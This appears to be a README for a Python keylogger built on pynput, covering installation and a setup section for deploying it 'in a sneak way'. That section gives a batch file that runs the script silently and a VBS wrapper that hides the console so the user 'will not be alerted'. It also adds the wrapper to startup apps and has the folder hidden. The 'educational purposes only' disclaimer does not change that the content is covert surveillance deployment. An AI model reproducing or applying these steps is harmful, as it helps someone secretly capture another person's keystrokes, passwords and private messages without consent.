# Key Logger

A basic key logger which will captures all the detail typed by physical Keyboard 

```Disclaimer: This content is intended for educational purposes only. I am not responsible for any misuse or incorrect implementation of the information provided```
## Tech Stack

![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) 

## Installation

Open Terminal

```bash
python3 -m pip install --upgrade pip
```
Check the pip version
```bash
pip --version
```
If version is showing you're good to go.  


Necessary pip modules 

```bash
pip install pynput

```
Check whether modules are installed properly or not
```bash
pip show pynput

```
If the details are showing you've installed all the necessary modules
## Setup

To deploy this project in a sneak way follow the instructions

*Create a folder here say ```open_it``` and execute the below instructions in it*

### Create a bat file

Copy the below snippet and make changes as said

```bash
@echo off
pythonw.exe "C:\path\to\your\keylogger.py"

```
Save as ```logger.bat```

Why? Whenever the user logs in cmd prompt will come up on screen and the program will start running

### Create a vbs script file

Copy the below snippet and make changes as said

```bash
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "C:\path\to\your\keylogger.bat", 0, False

```
Save as ```logger.vbs```

Why? If the user sees the cmd prompt up opening he will be on alert so this file is to make it physically invisible from the screen

### Add it to Startup apps 

Press ```WIN + R```

Create a shortcut file for ```logger.vbs```

### Final Step 

Lock and Hide the ```open_it``` folder.
